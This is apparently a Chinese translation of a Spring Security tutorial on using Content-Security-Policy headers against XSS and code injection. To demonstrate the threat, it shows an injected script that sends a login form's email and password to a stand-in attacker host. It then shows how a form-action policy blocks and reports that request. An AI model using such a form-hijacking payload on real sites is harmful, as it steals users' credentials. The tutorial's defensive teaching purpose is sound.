---
date: 2022-04-01
category:
  - Spring Security
  - Content Security Policy
tag:
  - XSS
  - Code Injection
  - Clickjacking
head:
  - - meta
    - name: keywords
      content: Spring Security, Content Security Policy, XSS, Code Injection, Clickjacking
  - - meta
    - name: description
      content: 学习如何在基于Spring Security的Web应用程序中使用内容安全策略头来减轻代码注入风险。
------
# Spring Security中的内容安全策略

如果你正在处理Spring Security（特别是OAuth）实现，一定要看看《Learn Spring Security》课程。

## 1. 概述

跨站脚本攻击（XSS）始终排在最普遍的网络攻击前十名。XSS攻击发生在Web服务器未验证或编码用户的恶意输入并将其呈现在页面上时。像XSS攻击一样，代码注入和点击劫持通过窃取用户数据和冒充用户，在Web应用程序中造成混乱。

在本教程中，我们将学习如何使用内容安全策略（CSP）头来减轻基于Spring Security的Web应用程序中的代码注入风险。

**内容安全策略（CSP）是一个HTTP响应头，可以显著减少现代浏览器中的代码注入攻击，如XSS、点击劫持等。**

Web服务器通过内容安全策略头指定浏览器可以呈现的资源白名单。这些资源可能是浏览器呈现的任何内容，例如CSS、JavaScript、图像等。

该头的语法如下：

```
Content-Security-Policy: `````<指令>`````; `````<指令>`````; `````<指令>`````; ...
```

此外，我们可以将此策略作为HTML页面的```<meta>```标签的一部分设置：

```
<meta http-equiv="Content-Security-Policy" content="`````<指令>`````;`````<指令>`````;`````<指令>`````; ...">
```

**此外，每个指令都包含一个键和多个值。可以有多个指令，每个指令由分号（;）分隔：**

```
Content-Security-Policy: script-src 'self' https://baeldung.com; style-src 'self';
```

在这个例子中，我们有两个指令（script-src和style-src），指令script-src有两个值（'self'和https://baeldung.com）。

## 3. 漏洞演示

现在，让我们看一个例子，了解XSS和代码注入漏洞有多严重。

### 3.1. 登录表单

通常，在Web应用程序中，在会话超时后，我们会将用户重定向到登录页面。标准登录表单具有用户名/密码字段和提交按钮：

```
`<span>`会话超时。请登录。`</span>`
`<form id="login" action="/login">`
    `<input type="email" class="form-control" id="email">`
    `<input type="password" class="form-control" id="password">`
    `<button type="submit">`登录`</button>`
`</form>`
```

### 3.2. 代码注入

用户可以通过表单字段在提供用户输入时注入可疑代码。例如，假设注册表单中的一个文本框接受用户名。

而不是用户名，用户可以输入```<script>``alert("this is not expected")``</script>```并提交表单。随后，当表单显示用户名时，它执行了脚本（在这种情况下显示一个消息）。脚本甚至可以加载外部脚本，可能会造成更严重的伤害。

类似地，假设我们有验证不足的表单字段。再次，用户利用这一点，将恶意JavaScript代码注入到DOM（文档对象模型）中：

```
``<script>``
    let form = document.forms.login;
    form.action = "https://youaredoomed.com:9090/collect?u=" + document.getElementById('email').value + "&p=" + document.getElementById('password').value;
``</script>``
```

这段注入的JavaScript代码在点击登录按钮时将用户重定向到恶意网站。

当一个毫无戒心的用户提交表单时，他被重定向到https://youaredoomed.com，他的凭证被暴露了。

### 3.3. 演示

让我们看看这种漏洞的实际效果。

通常，在会话超时后，服务器会将用户重定向到登录页面输入他的凭证。但是，注入的恶意代码将用户重定向到一个意外的网站，并带有用户的凭证：

## 4. Spring Security

在这一部分，让我们讨论如何减轻这些代码注入漏洞。

### 4.1. HTML meta标签

在前面的例子中添加内容安全策略头将阻止向恶意服务器提交表单。那么，让我们使用``<meta>``标签添加这个头，并检查行为：

```
`<meta http-equiv="Content-Security-Policy" content="form-action 'self';">`
```

添加上述meta标签防止浏览器向其他来源提交表单：

![img](https://www.baeldung.com/wp-content/uploads/2021/12/csp-1-2-1024x491-1.png)

**尽管meta标签可以减轻XSS和代码注入攻击，但它们的功能有限。例如，我们不能使用meta标签报告内容安全策略违规。**

因此，让我们利用Spring Security的力量，通过设置内容安全策略头来减轻这些风险。

### 4.2. Maven依赖项

首先，让我们将Spring Security和Spring Web依赖项添加到我们的pom.xml中：

```
``<dependency>``
    ``<groupId>``org.springframework.boot``</groupId>``
    ``<artifactId>``spring-boot-starter-security``</artifactId>``
``</dependency>``
``<dependency>``
    ``<groupId>``org.springframework.boot``</groupId>``
    ``<artifactId>``spring-boot-starter-web``</artifactId>``
``</dependency>``
```

### 4.3. 配置

接下来，让我们通过创建SecurityFilterChain bean来定义Spring Security配置：

```
@Configuration
public class ContentSecurityPolicySecurityConfiguration {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.headers(Customizer.withDefaults())
            .xssProtection(Customizer.withDefaults())
            .contentSecurityPolicy(contentSecurityPolicyConfig -> contentSecurityPolicyConfig.policyDirectives("form-action 'self'"));
        return http.build();
    }
}
```

在这里，我们声明了contentSecurityPolicy以将表单操作限制为同一来源。

### 4.4. 内容安全策略响应头

有了必要的配置，让我们验证Spring Security提供的安全性。为此，让我们打开浏览器的开发者工具（按F12或类似键），点击网络选项卡，并打开URL http://localhost:8080：

![img](https://www.baeldung.com/wp-content/uploads/2021/12/csp-2-1-1024x494-1.png)

现在，我们将填写表单并提交：

![img](https://www.baeldung.com/wp-content/uploads/2021/12/csp-3-1-1024x436-1.png)

**有了内容安全策略头，浏览器阻止了提交请求，减轻了泄露凭证的风险。**

同样，我们可以配置Spring Security以支持不同的指令。例如，这段代码指定浏览器只从同一来源加载脚本：

```
.contentSecurityPolicy("script-src 'self'");
```

同样，我们可以指示浏览器只从同一来源和somecdn.css.com下载CSS：

```
.contentSecurityPolicy("style-src 'self' somecdn.css.com");
```

此外，我们可以在内容安全策略头中组合任意数量的指令。例如，要限制CSS、JS和表单操作，我们可以指定：

```
.contentSecurityPolicy("style-src 'self' somecdn.css.com; script-src 'self'; form-action 'self'");
```

### 4.5. 报告

除了命令浏览器阻止恶意内容外，服务器还可以要求浏览器在阻止内容时发送报告。那么，让我们将report-uri指令与其他指令结合使用，以便浏览器在每次内容被阻止时发送POST。

浏览器将以下内容发布report-uri中定义的URL：

```
{
    "csp-report": {
{        "blocked-uri": ""}
{        "document-uri": ""}
{        "original-policy": ""}
{        "referrer": ""}
{        "violated-directive": ""}
    }
}
```

因此，我们需要定义一个API来接收浏览器发送的违规报告，并记录请求以示例和清晰。

**我们应该注意到，尽管report-uri指令已弃用，转而使用report-to，但大多数浏览器在日期上不支持report-to。** 因此，我们将使用report-uri和report-to指令进行报告。

首先，让我们更新我们的Spring Security配置：

```
String REPORT_TO = "{\\"group\\":\\"csp-violation-report\\",\\"max_age\\":2592000,\\"endpoints\\":[{\\"url\\":\\"https://localhost:8080/report\\"}]}";

http.csrf(AbstractHttpConfigurer::disable)
    .authorizeHttpRequests(authorizationManagerRequestMatcherRegistry -> authorizationManagerRequestMatcherRegistry.requestMatchers("/**").permitAll())
    .headers(httpSecurityHeadersConfigurer ->
                httpSecurityHeadersConfigurer
                       .addHeaderWriter(new StaticHeadersWriter("Report-To", REPORT_TO))
                       .xssProtection(Customizer.withDefaults())
                       .contentSecurityPolicy(contentSecurityPolicyConfig ->
                               contentSecurityPolicyConfig.policyDirectives("form-action 'self'; report-uri /report; report-to csp-violation-report")));
```

我们首先定义了一个名为csp-violation-report的report-to组，并关联了一个端点。接下来，在.contentSecurityPolicy中，我们使用这个组名作为report-to指令的值。

现在，当我们在浏览器中打开页面时，我们会看到：

![img](https://www.baeldung.com/wp-content/uploads/2021/12/csp-4-1024x512-1.png)

接下来，让我们填写表单并点击登录按钮。正如预期的那样，浏览器阻止了请求并向服务器控制台发送了一个报告，类似于：

```
Report: {"csp-report":{"blocked-uri":"https://youaredoomed.com:9090/collect?u=jhon.doe@mail.com&p=password","document-uri":"https://localhost:8080/","original-policy":"form-action 'self'; report-uri https://localhost:8080/report","referrer":"","violated-directive":"form-action"}}
```

以下是格式化后的JSON报告：

```
{
    "csp-report": {
{        "blocked-uri": "https://youaredoomed.com:9090/collect?u=jhon.doe@mail.com&p=password"}
{        "document-uri": "https://localhost:8080/"}
{        "original-policy": "form-action 'self'; report-uri https://localhost:8080/report"}
{        "referrer": ""}
{        "violated-directive": "form-action"}
    }
}
```

## 5. 结论

在本文中，我们看到了如何保护我们的Web应用程序免受点击劫持、代码注入和XSS攻击。

虽然没有完全防护这些攻击的方法，但内容安全策略头有助于减轻这些攻击的大部分。值得注意的是，截至日期，大多数现代浏览器并不完全支持这个头。因此，设计和构建具有坚实安全原则和标准的应用程序至关重要。

如常，完整的源代码可在GitHub上获得。

![img](https://www.baeldung.com/wp-content/themes/baeldung/icon/logo.svg)
OK